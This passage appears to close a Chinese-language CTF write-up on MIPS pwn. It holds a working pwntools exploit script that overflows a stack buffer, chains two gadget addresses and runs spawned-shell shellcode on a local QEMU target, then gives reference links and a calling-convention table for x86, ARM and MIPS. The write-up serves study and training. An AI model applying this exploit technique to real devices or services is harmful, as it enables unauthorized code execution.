context(arch='mips',endian='big',log_level='debug')
io = process(["qemu-mips","./pwn"])
io.sendlineafter("number:","1")

ra = 0x004273C4 # move sp+0x64 to a2 -> jmp s0
s0 = 0x00421684 # jmp a2                   

payload = '1:'
payload += 'a'*0x6c + p32(s0) + 'a'*0x20 + p32(ra)
payload += 'a'*0x64 + asm(shellcraft.sh())
io.sendlineafter("Job.'",payload)
io.interactive()
```

## 总结

- [ARM架构下的 Pwn 的一般解决思路](https://www.anquanke.com/post/id/199112)
- [固件安全之MIPS架构栈溢出利用技巧](https://www.anquanke.com/post/id/202219)


|          | x86_32(8+2)        | x86_64 (16+2)            | arm32(16+2)              | mips32(32+8)                    |
| -------- | ------------------ | ------------------------ | ------------------------ | ------------------------------- |
| 调用指令 | call               | call                     | b系列指令                | jal bal                         |
| 返回地址 | call将返回地址压栈 | call将返回地址压栈       | bl将返回地址送入lr寄存器 | jal bal 将 +8 地址压入ra（r31） |
| 参数     | 栈                 | rdi rsi rdx rcx r8 r9 栈 | r0-r3,栈                 | a0-a3(r4-r7)                    |
| 返回值   | eax                | rax                      | r0                       | v0-v1(r2-r3)                    |
| 栈       | ebp esp            | rbp rsp                  | fp(r11) sp(r13)          | fp(r13) sp(r29)                 |